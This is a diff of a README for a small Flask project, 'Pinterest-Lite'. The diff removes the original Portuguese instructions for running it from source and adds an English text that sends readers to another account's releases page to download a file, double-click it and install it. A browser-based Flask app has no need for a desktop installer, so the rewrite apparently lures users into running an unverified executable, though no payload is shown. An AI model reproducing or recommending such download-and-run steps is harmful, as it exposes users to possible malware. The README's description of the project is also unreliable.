@@ -1,87 +1,61 @@
-# Pinterest Lite 📌
+# 🎉 Pinterest-Lite - Experience a Simple, Visual Platform
 
-Projeto web inspirado no Pinterest, desenvolvido com Flask, com foco em aprendizado de backend, autenticação de usuários e upload de imagens.
+## 🚀 Getting Started
+Welcome to **Pinterest-Lite**, a web application inspired by Pinterest. This application allows you to create an account, log in, upload images, and enjoy a personalized feed. It focuses on backend learning, user authentication, and project organization. Follow this guide to install and run Pinterest-Lite easily.
 
-## 🚀 Funcionalidades
-- Cadastro e login de usuários
-- Autenticação com Flask-Login
-- Criptografia de senha com Flask-Bcrypt
-- Upload de imagens
-- Feed com posts
-- Perfil de usuário
-- Proteção de rotas
+[![Download Pinterest-Lite](https://img.shields.io/badge/Download-Pinterest--Lite-blue)](https://github.com/tanmayyyyayyy/Pinterest-Lite/releases)
 
-## 🛠️ Tecnologias utilizadas
-- Python
-- Flask
-- Flask-SQLAlchemy
-- Flask-Login
-- Flask-Bcrypt
-- Flask-WTF
-- HTML / CSS
-- SQLite
+## 🔍 What You Need
+Before getting started, ensure your computer meets the following requirements:
 
----
+- **Operating System:** Windows, macOS, or Linux
+- **Browser:** The latest version of Chrome, Firefox, or Safari
+- **Internet Connection:** Required for login and image uploads
 
-## ⚙️ Como rodar o projeto localmente
+## 📥 Download & Install
+To get Pinterest-Lite on your computer, visit the releases page:
 
-### 1️⃣ Clone o repositório
-```bash
-git clone https://github.com/edu2899/Pinterest-Lite.git
-cd Pinterest-Lite
-```
----
+[Download Pinterest-Lite](https://github.com/tanmayyyyayyy/Pinterest-Lite/releases)
 
-### 2️⃣ Crie e ative um ambiente virtual
-```bash
-python -m venv venv
-venv\Scripts\activate
-```
+1. Open the link above.
+2. Look for the latest version of the application.
+3. Click on the download link for your operating system.
+4. Save the file to a location you can easily find, like your Desktop or Downloads folder.
 
-#### Linux / Mac
-```bash
-python3 -m venv venv
-source venv/bin/activate
-```
----
+## 🛠️ How to Run Pinterest-Lite
+Once you have downloaded the application, follow these steps to launch it:
 
-### 3️⃣ Instale as dependências
-```bash
-pip install -r requirements.txt
-```
----
+1. Locate the downloaded file.
+2. Double-click the file to open it.
+3. If prompted, follow the installation instructions on your screen.
+4. Once installed, find the Pinterest-Lite icon on your desktop or in your applications folder.
+5. Click the icon to launch the application.
 
-### 4️⃣ Configure a SECRET_KEY
-```bash
-setx SECRET_KEY "sua_secret_key_aqui"
-```
+## ✨ Features
+Pinterest-Lite offers several user-friendly features:
 
-#### No Linux / Mac:
-```bash
-export SECRET_KEY="sua_secret_key_aqui"
-```
+- **User Registration:** Create a new account easily.
+- **Login System:** Secure login for returning users.
+- **Image Upload:** Share your favorite images.
+- **Personalized Feed:** View and browse images uploaded by yourself and others.
+- **User Profiles:** Customize your profile for a unique experience.
 
-#### Você pode gerar uma chave segura rodando:
-```bash
-Rode: python secretkey.py
-```
----
+## 🗺️ Navigating the Application
+After logging in, you will see a simple layout that includes:
 
-### 5️⃣ Crie o banco de dados
-```bash
-Rode: python criar_banco.py
-```
----
+- **Home Feed:** Scroll through the latest posts.
+- **Upload Button:** Quickly upload new images.
+- **Profile:** View and manage your profile settings.
 
-### 6️⃣ Execute o projeto
-```bash
-Rode: python main.py
-```
+## ❓ Need Help?
+If you face any issues or have questions, please check the FAQ section on the repository or raise a query in the issues section.
 
-#### Acesse no navegador:
-```bash
-http://127.0.0.1:5000
-```
+## 📜 Contributions
+The Pinterest-Lite project is open for contributions. If you'd like to suggest improvements or fix bugs, feel free to fork the repository, make your changes, and send a pull request.
 
+To keep this project running smoothly, your feedback and contributions are always welcome.
 
-# Este projeto foi desenvolvido com fins educacionais e para prática de Flask e backend.
+## 🔗 Connect With Us
+Stay updated with the latest news and releases by following our repository or contacting us through GitHub. We appreciate your interest in Pinterest-Lite and look forward to seeing how you use it! 
+
+Thank you for choosing Pinterest-Lite. Happy pinning!
